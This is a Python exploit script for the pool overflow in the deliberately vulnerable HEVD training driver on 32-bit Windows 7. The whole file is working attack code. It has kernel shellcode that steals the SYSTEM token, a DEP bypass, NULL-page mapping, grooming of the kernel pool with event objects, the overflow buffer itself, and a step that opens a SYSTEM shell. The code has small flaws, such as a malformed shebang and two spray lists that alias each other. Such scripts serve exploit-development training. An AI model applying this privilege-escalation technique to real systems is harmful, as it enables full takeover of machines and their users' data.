#!etc/python
#Written by: Jb05s
#Purpose: HEVD - Pool Overflow (Windows 7 x86)

import struct, sys
from ctypes import *
from subprocess import *
 
def main():
    kernel32 = windll.kernel32
    ntdll = windll.ntdll

    vulnDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not vulnDevice or vulnDevice == -1:
        print "Unable to get driver handle"
        sys.exit(0)
    else:
    	print "Collecting driver information..\n"

    print "Sending buffer..\n"

    print "Stealing SYSTEM Token..\n"

    sc = bytearray(
    	"\x90\x90\x90\x90"              # NOP Sled
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx
        "\x75\xED"                      # jnz
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        "\x61"                          # popad
        "\xC2\x10\x00"                  # ret 16
    )

    #Bypass DEP
    ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(sc)), c_int(0x3000), c_int(0x40))
    buff = (c_char * len(sc)).from_buffer(sc)
    kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(sc)))

    print "[+] Ring0 shellcode pointer: {0}".format(hex(ptr))

    #Allocating/Mapping NULL page.."
    null_status = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
    if null_status != 0x0:
    	print "Failed to allocate NULL page.."
        sys.exit(-1)
    else:
    	print "NULL page allocated!\n"

    print "Writing ring0 pointer {0} in location 0x60..".format(hex(ptr))
    if not kernel32.WriteProcessMemory(0xFFFFFFFF, 0x60, byref(c_void_p(ptr)), 0x4, byref(c_ulong())):
        print "Failed to write at 0x60 location.."
        sys.exit(-1)

    buffer = "A" * 504
    buffer += struct.pack('<L', 0x04080040)
    buffer += struct.pack('<L', 0xEE657645)
    buffer += struct.pack('<L', 0x00000000)
    buffer += struct.pack('<L', 0x00000040)
    buffer += struct.pack('<L', 0x00000000)
    buffer += struct.pack('<L', 0x00000000)
    buffer += struct.pack('<L', 0x00000001)
    buffer += struct.pack('<L', 0x00000001)
    buffer += struct.pack('<L', 0x00000000)
    buffer += struct.pack('<L', 0x00080000)
    buffer_ad = id(buffer) + 20

    spray_event1 = spray_event2 = []

    for j in xrange(10000):
    	spray_event1.append(kernel32.CreateEventA(None, False, False, None))
    for j in xrange(5000):
    	spray_event2.append(kernel32.CreateEventA(None, False, False, None))
    	
    for j in xrange(0, len(spray_event2), 16):
    	for b in xrange(0, 8, 1):
    		kernel32.CloseHandle(spray_event2[j + b])

    #hex((0x00000022 << 16) | (0x00000000 << 14) | (0x803 << 2) | 0x00000003) = 0x22200F
    kernel32.DeviceIoControl(vulnDevice, 0x22200F, buffer_ad, len(buffer), None, 0, byref(c_ulong()), None)

    for j in xrange(0, len(spray_event1)):
    	kernel32.CloseHandle(spray_event1[j])

    for j in xrange(8, len(spray_event2), 16):
    	for b in xrange(0, 8, 1):
    		kernel32.CloseHandle(spray_event2[j + b])

    print "Shell incoming!"
    Popen("start cmd", shell=True)
    
if __name__ == "__main__":
    main()
